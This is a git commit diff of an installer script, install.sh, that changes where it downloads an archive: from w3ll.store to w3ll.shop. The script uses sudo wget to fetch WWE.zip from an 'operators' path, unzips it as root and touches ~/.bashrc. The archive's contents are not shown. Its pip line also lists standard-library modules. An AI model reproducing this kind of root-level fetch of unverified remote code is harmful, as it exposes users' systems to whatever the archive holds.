d212fadde2c40a8f8dbb151d6d4d7c2ea1865f2f
W3LL STORE <81862344+W3LLLL@users.noreply.github.com>
2022-06-09 12:06:18 +0800

    Update install.sh

--- install.sh
+++ install.sh
@@ -20,7 +20,7 @@ sudo apt-get install -y python3
 sudo apt-get install -y python3-pip
 sudo pip3 install requests colorama itertools idna uritools appdirs tldextract socket random  struct traceback urlextract configparser
 sudo apt install -y nano
-sudo wget https://w3ll.store/operators/WWE.zip
+sudo wget https://w3ll.shop/operators/WWE.zip
 sudo unzip -o WWE.zip
 sudo rm WWE.zip
 cp ~/.bashrc ~/.bashrc-bak
